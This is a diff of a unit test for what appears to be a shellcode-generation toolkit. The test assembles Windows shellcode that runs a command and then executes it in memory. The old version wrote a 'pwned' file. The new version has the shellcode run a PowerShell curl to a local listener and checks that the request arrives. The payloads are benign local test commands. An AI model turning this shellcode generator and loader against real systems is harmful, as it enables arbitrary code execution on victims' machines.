@@ -1,7 +1,7 @@
-import os
+import random
+import socket
 import time
 import unittest
-import uuid
 
 from coder import exec_command
 from runner import load_shellcode, run_shellcode
@@ -10,26 +10,28 @@ from stones import assemble
 
 class TestExecCommand(unittest.TestCase):
     def test_run_shellcode(self):
-        tmp_dir = ".\\tmp"
-        test_file = str(uuid.uuid4())
+        port = random.randint(49152, 65535)
 
-        code = exec_command.generate(
-            cmd=f"powershell -c mkdir tmp; echo pwned > {tmp_dir}\\{test_file}",
-            bad_chars=b"\x00",
-            exit_func=("ntdll.dll", "RtlExitUserThread"),
-            debug=False,
-        )
-        shellcode = assemble(code)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind(("0.0.0.0", port))
+            s.listen()
 
-        ptr = load_shellcode(shellcode)
-        run_shellcode(ptr, wait=True)
-        time.sleep(1)
+            code = exec_command.generate(
+                cmd=f"powershell -c curl http://127.0.0.1:{port}/pwned | Out-Null",
+                bad_chars=b"\x00",
+                exit_func=("ntdll.dll", "RtlExitUserThread"),
+                debug=False,
+            )
+            shellcode = assemble(code)
 
-        self.assertTrue(os.path.exists(f"{tmp_dir}\\{test_file}"))
+            ptr = load_shellcode(shellcode)
+            run_shellcode(ptr, wait=True)
+            time.sleep(1)
 
-        with open(f"{tmp_dir}\\{test_file}", "r", encoding="utf_16") as f:
-            content = f.read()
-        self.assertIn("pwned", content)
+            client_s, _ = s.accept()
 
-        os.remove(f"{tmp_dir}\\{test_file}")
-        os.removedirs(tmp_dir)
+        resp = client_s.recv(0x1000)
+        client_s.send(b"HTTP/1.1 200 OK\r\n\r\n")
+        client_s.close()
+
+        self.assertIn(b"GET /pwned HTTP/1.1", resp)
